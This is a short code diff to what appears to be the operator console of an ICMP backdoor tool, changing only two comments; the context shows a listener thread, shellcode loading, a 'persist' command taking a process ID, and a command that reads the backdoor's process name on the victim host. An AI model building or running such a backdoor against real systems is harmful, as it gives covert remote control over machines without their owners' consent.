@@ -129,7 +129,7 @@ if shellcode_file != "":
 # Create the listener thread
 thread.start_new_thread(start_listener, (iface, None))
 
-#Ghetto wau to ensure I got all output
+#Ghetto output, but works
 def cmdoutput(line):
    global cmdout
    key_info = generate_key_info()
@@ -229,7 +229,7 @@ class Shell(cmd.Cmd):
         print "Dude you didnt enter a pid... ex: persist 5141"
 
     def do_showmyproc(self,line):
-      "Display the icmp backdoor process name, may only not be accurate..."
+      "Display the icmp backdoor process name, may not be accurate if you spawned this yourself..."
       cmdoutput("cat /proc/$PPID/cmdline && echo \" PID: $PPID\"")
 
     def do_prompt(self, line):
